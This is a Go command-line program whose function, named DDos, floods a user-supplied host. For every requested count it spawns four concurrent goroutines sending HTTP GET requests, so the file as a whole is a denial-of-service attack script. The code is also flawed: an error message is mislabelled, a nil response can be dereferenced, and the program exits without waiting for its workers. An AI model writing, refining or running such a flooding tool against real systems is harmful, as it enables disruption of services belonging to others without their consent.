package cli

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/urfave/cli/v2"
)

func CliApp() {
	app := &cli.App{
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:    "host",
				Aliases: []string{"wh"},
				Usage:   "Set the host target",
			},
			&cli.StringFlag{
				Name:    "requests",
				Aliases: []string{"r"},
				Usage:   "Quantity of requests",
			},
		},
		Action: func(cCtx *cli.Context) error {
			// host := ""

			// if cCtx.NArg() > 0 {
			// 	host = cCtx.Args().Get(0)
			// }

			if cCtx.String("host") == "" {
				return fmt.Errorf("host is empty")
			}

			if cCtx.String("requests") == "" {
				return fmt.Errorf("host is empty")
			}

			if cCtx.String("host") != "" && cCtx.String("requests") != "" {
				fmt.Println(cCtx.String("host"))
				fmt.Println(cCtx.String("requests"))

				DDos(cCtx.String("host"), cCtx.String("requests"))
			}

			return nil
		},
	}

	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
}

func recoverConnection() {
	if r := recover(); r != nil {
		fmt.Println("Recover OK")
	}
}

func verifyError(err error, statusCode int) {
	if statusCode != 200 {
		fmt.Println("status-code", statusCode)
		
	}
}

func DDos(host string, requests string) {


	r, err := strconv.ParseInt(requests, 10, 64)
	if err != nil {
		log.Fatal(err)
	}
	
	for i := 0; int64(i) < r; i++ {
		fmt.Println(i)
		go workerRequest(host)
		go workerRequest(host)
		go workerRequest(host)
		go workerRequest(host)
	}

	fmt.Println("fim")

}

func workerRequest(host string) {
	url := host
	client := &http.Client{}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Add("cache-control", "max-age=0")

	res, err := client.Do(req)
	verifyError(err, res.StatusCode)

	defer recoverConnection()
}
